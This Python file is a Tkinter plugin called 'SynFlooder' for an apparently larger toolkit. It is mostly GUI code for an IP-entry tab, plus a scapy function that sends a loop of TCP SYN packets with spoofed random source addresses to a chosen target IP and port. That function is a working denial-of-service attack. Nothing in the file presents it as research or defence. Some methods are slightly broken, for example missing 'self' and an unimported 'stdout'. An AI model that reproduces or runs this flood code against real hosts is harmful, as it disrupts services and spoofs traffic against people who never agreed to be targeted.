try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

from tkinter import messagebox 

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True

from scapy.all import *
from random import randint


class plugin_dosbomb:
	plugin_name="SynFlooder"
	plugin_version="1.00"
	plugin_author="Suryasaradhi"
	plugin_date="18/08/2020"
	plugin_file="synflooder.py"
	plugin_class="plugin_synflooder"
	plugin_internal=True 

	#IP enter gadget
	class iPentry(tk.Widget):
		def __init__(self, master):
			tk.Widget.__init__(self, master, '::ipentry::ipentry')

		def get(self):
			return self.tk.call(self._w, 'get')

		def complete(self):
			return self.tk.call(self._w, 'complete')

	def getIP(self,event):
		myip = self.enterIp.get()
		print(f"myip is {myip}")

	def process(self):
		print("Loaded Syn_Flooder")

	def gui(self,guihandl):
		guihandl['root'].tk.call('package','require','ipentry')
		self.PNotebook1_t5 = tk.Frame(guihandl['notbkhandl'])
		guihandl['notbkhandl'].add(self.PNotebook1_t5, padding=3)
		guihandl['notbkhandl'].tab(guihandl['notbkhandl'].index("end")-1, text="SynFlooder",compound="none",underline="-1",)
		self.PNotebook1_t5.configure(background="#d9d9d9")
		self.PNotebook1_t5.configure(highlightbackground="#d9d9d9")
		self.PNotebook1_t5.configure(highlightcolor="black")
		self.enterIp = self.iPentry(self.PNotebook1_t5)
		self.enterIp.pack()
		labelIP = tk.Label(self.PNotebook1_t5, text="Enter IP:")
		labelIP.pack()
		self.enterIp.place(relx=0.339, rely=0.485)
		labelIP.place(relx=0.139, rely=0.485)
		#guihandl['root'].bind('<Return>', self.getIP)

		print("Synflooder gui shown")

	def randomIP():
		ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
		return ip


	def randInt():
		x = randint(1000, 9000)
		return x


	def SYN_Flood(dstIP, dstPort, counter,s_port,s_eq,w_indow):
		total = 0
		print ("Packets are sending ...")

		for x in range (0, counter):
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()

			IP_Packet = IP ()
			IP_Packet.src = randomIP()
			IP_Packet.dst = dstIP

			TCP_Packet = TCP ()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = int(dstPort)
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			send(IP_Packet/TCP_Packet, verbose=0)
			total+=1

		stdout.write("\nTotal packets sent: %i\n" % total)

